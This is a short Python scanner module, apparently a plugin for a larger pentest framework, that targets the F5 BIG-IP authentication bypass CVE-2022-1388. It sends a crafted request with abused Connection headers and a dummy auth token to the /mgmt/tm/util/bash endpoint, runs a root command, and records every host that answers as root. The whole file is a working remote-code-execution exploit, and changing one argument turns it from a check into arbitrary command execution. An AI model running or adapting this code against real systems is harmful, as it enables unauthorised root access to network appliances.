#!/user/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3
from libs.public.outprint import OutPrintInfo

urllib3.disable_warnings()


class Cve_2022_1388:
    def check(self,url):
        headers = {
            "User-Agent": self.header,
            "Content-type": "application/json",
            "Connection": "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host",
            "X-F5-Auth-Token": "anything",
            "Authorization": "Basic YWRtaW46"}
        try:
            endpoint = "/mgmt/tm/util/bash"
            payload = {"command": "run", "utilCmdArgs": "-c id"}
            res = requests.post(url + endpoint, headers=headers, json=payload, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if (res.status_code == 200) and ('uid=0(root) gid=0(root) groups=0(root)' in res.text):
                OutPrintInfo("Big-IP", f"[b bright_red]Host: {url} F5 is vulnerable!!!")
                with open("./result/bigIpRce.txt", "a") as w:
                    w.write(f"{url}\n")
                # OutPrintInfo("Big-IP",f"Host: {url} F5 not vulnerability")
                # print(f"\033[0;32;22m[-] Host: {url} F5 not vulnerability \033[0m")
        except Exception as e:
            pass
            # OutPrintInfo("Big-IP", f"Host: {url} Connection Fail")
            # print(f"\033[0;33;22m[x] Host: {url} Connection Fail \033[0m")
    def main(self,target):
        url = target[0].strip("/ ")
        self.header = target[1]
        self.ssl = target[2]
        proxy = target[3]
        self.proxy = {"http":proxy,"https":proxy}
        self.timeout = int(target[4])
        self.check(url)






